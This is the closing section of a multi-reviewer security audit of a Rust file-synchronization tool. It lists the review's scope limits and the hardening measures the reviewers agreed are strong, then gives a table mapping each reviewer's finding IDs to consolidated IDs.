Not performed by any reviewer: real multi-host failover, Linux/FreeBSD-specific runtime behavior, GUI interaction, a live dependency-CVE scan, a historical secret audit, fuzzing beyond the in-tree adversarial frame tests. A targeted credential-pattern search (ASTRA) and secret review (GLM, KIMI) found no embedded credentials.

---

## What the reviewers agreed is strong

Listed so the fixes do not regress them. All were checked by at least two of DEEPSEEK, GLM, KIMI and OPUS.

- Frame length and lz4 decompressed size validated against the 64 MiB frame cap **before** allocation, both directions, with an in-tree adversarial suite (random bytes, truncation at every offset, over-cap prefixes, bombs, unknown flags). `src/transport/mod.rs:1204-1253`.
- Path traversal rejected component-by-component (`validate_path`/`validate_name`) before any filesystem contact and re-applied to every child name. `src/endpoint/local.rs:3039-3062`.
- Symlinks never traversed during applies: `resolve_parent` walks every parent with `symlink_metadata`; removals refuse a swapped entry; deletes are expectation-gated on digest, size, mtime, inode; root deletion refused twice. Creation is atomic via `RENAME_NOREPLACE`/`renamex_np`.
- Mode bits masked to `0o777` (no setuid propagation); `lchown` with locally configured owner only; peer mtimes never applied.
- Staged content digest-verified while copying, re-hashed for survivors, and re-checked with `symlink_metadata` at publication.
- Case/Unicode collision handling: per-volume probing, fold-key dedup, delete-before-create for case-only renames, NFD→NFC recomposition.
- Handshake pins exact version plus compatibility epoch (`COMPATIBILITY_EPOCH = 13`); failed handshakes reap the child.
- Control socket: 0600 socket, 0700 parent, `SO_PEERCRED`/`getpeereid` same-uid check before the first frame, 2 s timeouts, shallow command set.
- SSH invocations use argv form with `--` before the host; `BatchMode=yes`; no shell; compile-time-constant remote command; leading-dash refusal in config parsing.
- Alert data reaches hooks only as environment/stdin, never interpolated into the command string.
- Ignore patterns cannot escape (`globset` with `literal_separator(true)`, root-relative).
- launchd plist XML escaping and tray AppleScript escaping are correct.
- Ownership resolution uses reentrant `getpwnam_r`/`getgrnam_r`; all ~15 `unsafe` blocks are straightforward libc wrappers with no remote data.
- rsync is in-process, pure delta over `Read`/`Write`, block ranges `checked_add`/`checked_mul`, full 32-byte BLAKE3 digests.
- Peering push containment: `is_pushable` allowlists `config.toml`, `name`, `ignores/<plain>`, `sessions/<plain>`; pushed `on_alert` never executes on followers.
- Updater: checksum verified before anything moves, rename-into-place, `autobahn.previous` kept, rollback on failed restart, refuses missing `SHA256SUMS`, whole-name matching.
- Reload: byte-compare double read, full validation on every edit, refused edits keep old plans running, `deny_unknown_fields` throughout.
- CI: no `pull_request_target`, no `github.event.*` in `run:` blocks, P12 in a throwaway random-password keychain with `if: always()` cleanup, tag↔version gate, `Cargo.lock` committed. No secrets in the repository.
- Invariant-driven engineering: `INVARIANTS.md` names the enforcing code and test for every claim, many mutation-checked; the journal is cut at every byte and the connection at every frame boundary in tests; a TLA+ spec is replayed against the real reconciler; comments explain why.

---

## Cross-reference: original IDs to consolidated IDs

| Report | Original | Consolidated |
|---|---|---|
| ASTRA | F01 | H-1 |
| ASTRA | F02 | H-2 |
| ASTRA | F03 | H-3 |
| ASTRA | F04 | H-9 |
| ASTRA | F05 | H-10 |
| ASTRA | F06 | H-11 |
| ASTRA | F07 | H-12 |
| ASTRA | F08 | H-13 |
| ASTRA | F09 | H-14 |
| ASTRA | F10 | H-15 |
| ASTRA | F11 | H-7 |
| ASTRA | F12 | H-16 |
| ASTRA | F13 | M-22 |
| ASTRA | F14 | M-23 |
| ASTRA | F15 | M-24 |
| ASTRA | F16 | M-25 |
| ASTRA | F17 | M-26 |
| ASTRA | F18 | M-3 |
| ASTRA | F19 | M-29 |
| ASTRA | F20 | M-42 |
| ASTRA | F21 | M-43 |
| ASTRA | F22 | M-44 |
| ASTRA | F23 | M-39 |
| ASTRA | F24 | M-40 |
| ASTRA | F25 | M-41 |
| ASTRA | F26 | M-21 |
| ASTRA | F27 | M-38 |
| ASTRA | F28 | P-1 |
| ASTRA | F29 | P-13 |
| ASTRA | F30 | M-50 |
| ASTRA | F31 | M-51 |
| ASTRA | F32 | M-52 |
| ASTRA | F33 | M-47 |
| ASTRA | F34 | M-46 |
| ASTRA | F35 | M-48 |
| ASTRA | F36 | M-49 |
| ASTRA | hardening: terminal control | M-6 |
| ASTRA | hardening: installer | M-17 |
| ASTRA | hardening: remote cleanup | M-8 |
| ASTRA | cautions: recount/problem cost | P-2 |
| ASTRA | cautions: job.py CPU | M-55 |
| ASTRA | cautions: cycle_cost.rs | M-56 |
| DEEPSEEK | F1 | H-19 |
| DEEPSEEK | F2 | H-18 |
| DEEPSEEK | F3 | H-29 |
| DEEPSEEK | F4 | M-8 |
| DEEPSEEK | F5 | M-1 |
| DEEPSEEK | F6 | M-2 |
| DEEPSEEK | F7 | M-17 |
| DEEPSEEK | F8 | H-28 |
| DEEPSEEK | F9 | H-27 |
| DEEPSEEK | F10 | M-3 |
| DEEPSEEK | F11 | M-21 |
| DEEPSEEK | F12 | M-10 |
| DEEPSEEK | F13 | L-8 |
| DEEPSEEK | F14 | M-5 |
| DEEPSEEK | F15 | M-5 |
| DEEPSEEK | F16 | H-26, L-2 |
| DEEPSEEK | F17 | L-1 |
| DEEPSEEK | F18 | L-1 |
| DEEPSEEK | F19 | M-6 |
| DEEPSEEK | F20 | M-4 |
| DEEPSEEK | F21 | M-18 |
| DEEPSEEK | F22 | M-19 |
| DEEPSEEK | F23 | L-9 |
| DEEPSEEK | F24 | M-11 |
| DEEPSEEK | I1 | L-33 |
| DEEPSEEK | I2 | H-20 |
| DEEPSEEK | I3 | L-34 |
| GLM | H1 | H-27 |
| GLM | H2 | H-28 |
| GLM | M1 | M-1 |
| GLM | M2 | H-19 |
| GLM | M3 | H-6 |
| GLM | M4 | M-10 |
| GLM | M5 | H-18 |
| GLM | M6 | M-17 |
| GLM | M7 | M-8 |
| GLM | M8 | M-6 |
| GLM | L1 | M-9 |
| GLM | L2 | L-1 |
| GLM | L3 | H-26 |
| GLM | L4 | H-21 |
| GLM | L5 | H-9 |
| GLM | L6 | M-2 |
| GLM | L7 | L-32 |
| GLM | L8 | M-4, M-13 |
| GLM | L9 | M-7, L-35 |
| GLM | verified-safe gap note | L-36 |
| KIMI | ABN-C1 | C-2 |
| KIMI | ABN-H1 | H-18 |
| KIMI | ABN-H2 | H-20 |
| KIMI | ABN-H3 | H-21 |
| KIMI | ABN-H4 | H-18 |
| KIMI | ABN-H5 | H-22 |
| KIMI | ABN-H6 | H-19 |
| KIMI | ABN-H7 | H-6 |
| KIMI | ABN-H8 | H-7 |
| KIMI | ABN-H9 | H-23 |
| KIMI | ABN-H10 | H-24 |
| KIMI | ABN-H11 | H-25 |
| KIMI | ABN-H12 | H-26 |
| KIMI | ABN-M1 | M-1 |
| KIMI | ABN-M2 | M-3, L-2 |
| KIMI | ABN-M3 | M-5 |
| KIMI | ABN-M4 | M-3 |
| KIMI | ABN-M5 | M-14 |
| KIMI | ABN-M6 | M-15 |
| KIMI | ABN-M7 | M-10 |
| KIMI | ABN-M8 | M-11 |
| KIMI | ABN-M9 | M-12 |
| KIMI | ABN-M10 | M-13 |
| KIMI | ABN-M11 | H-8 |
| KIMI | ABN-M12 | M-2 |
| KIMI | ABN-M13 | M-6 |
| KIMI | ABN-M14 | H-29 |
| KIMI | ABN-M15 | M-7 |
| KIMI | ABN-M16 | M-4 |
| KIMI | ABN-M17 | M-16 |
| KIMI | ABN-M18 | H-28, M-17, M-18 |
| KIMI | ABN-M19 | M-19 |
| KIMI | ABN-M20 | M-20 |
| KIMI | ABN-L1 | L-1 |
| KIMI | ABN-L2 | M-21 |
| KIMI | ABN-L3 | L-3 |
| KIMI | ABN-L4 | L-4 |
| KIMI | ABN-L5 | L-9 |
| KIMI | ABN-L6 | L-5 |
| KIMI | ABN-L7 | L-10 |
| KIMI | ABN-L8 | L-11 |
| KIMI | ABN-L9 | H-5 |
| KIMI | ABN-L10 | L-12 |
| KIMI | ABN-L11 | L-13 |
| KIMI | ABN-L12 | L-6 |
| KIMI | ABN-L13 | L-7 |
| KIMI | ABN-L14 | M-19 |
| KIMI | ABN-L15 | M-57 |
| KIMI | ABN-L16 | L-8 |
| KIMI | ABN-I1 | I-1 |
| KIMI | ABN-I2 | I-2 |
| KIMI | ABN-I3 | I-3 |
| KIMI | ABN-I4 | M-9 |
| OPUS | C1 | C-1 |
| OPUS | H1 | H-1 |
| OPUS | H2 | H-4 |
| OPUS | H3 | H-3 |
| OPUS | H4 | H-5, H-6 |
| OPUS | H5 | H-7 |
| OPUS | H6 | H-8 |
| OPUS | H7 | H-9, H-10, M-42 |
| OPUS | H7 related peering bugs | M-45 |
| OPUS | H8 | H-17 |
| OPUS | M1 | M-32 |
| OPUS | M2 | M-33 |
| OPUS | M3 | M-30 |
| OPUS | M4 | M-34 |
| OPUS | M5 | M-12 |
| OPUS | M6 | M-12 |
| OPUS | M7 | M-24 |
| OPUS | M8 | M-25 |
| OPUS | M9 | M-27 |
| OPUS | M10 | M-26 |
| OPUS | M11 | M-31 |
| OPUS | M12 | M-35 |
| OPUS | M13 | M-36 |
| OPUS | M14 | M-12 |
| OPUS | M15 | M-21 |
| OPUS | M16 | M-21 |
| OPUS | M17 | M-37 |
| OPUS | M18 | M-28 |
| OPUS | Low: keep-both rename | L-20 |
| OPUS | Low: parallel publish race | M-29 |
| OPUS | Low: journal dir entry | L-16 |
| OPUS | Low: intents lost at open | L-17 |
| OPUS | Low: compaction failure | L-18 |
| OPUS | Low: silent truncation | L-19 |
| OPUS | Low: scan-delta desync | L-14 |
| OPUS | Low: stderr relay stops early | M-13 |
| OPUS | Low: every install failure Unreachable | L-21 |
| OPUS | Low: upload errors | L-22 |
| OPUS | Low: rollback mixes versions | M-40 |
| OPUS | Low: reload reads twice | L-23 |
| OPUS | Low: every reload stops everything | L-24 |
| OPUS | Low: pool slots | L-25 |
| OPUS | Low: racy-mtime | L-26 |
| OPUS | Low: scanning flag | L-27 |
| OPUS | Low: wildcard negations | L-28 |
| OPUS | Low: select relative path | L-29 |
| OPUS | Low: progress keyed by host | L-30 |
| OPUS | Low: scripts/mi | M-52 |
| OPUS | Low: docs one-way-conflict | L-31 |
| OPUS | S1 | H-19 |
| OPUS | S2 | C-2 |
| OPUS | S3 | M-3 |
| OPUS | S4 | M-1 |
| OPUS | S5 | M-9 |
| OPUS | S6 | H-28, M-17 |
| OPUS | S7 | M-19 |
| OPUS | S8 | H-26, M-4, M-18 |
| OPUS | S9 | H-27, H-29 |
| OPUS | S10 | H-30 |
| OPUS | S11 | M-6 |
| OPUS | Sec Low: prune_agents | M-8 |
| OPUS | Sec Low: fallback control socket | M-2 |
| OPUS | Sec Low: state root perms | L-1 |
| OPUS | Sec Low: pushed peering files | H-18, H-20 |
| OPUS | Sec Low: scanner walks by path | H-24, M-16 |
| OPUS | Sec Low: ctime | L-15 |
| OPUS | Sec Low: Response::Scan | L-9 |
| OPUS | Sec Low: bincode/GTK | L-8 |
| OPUS | P1–P11 | P-2 to P-12 |
| OPUS | Perf info | P-14 |
| OPUS | §4 code quality | Code quality, I-4, I-5, L-37 to L-40 |
| OPUS | §5 test gaps | Test gaps, M-53, M-54, M-58 |
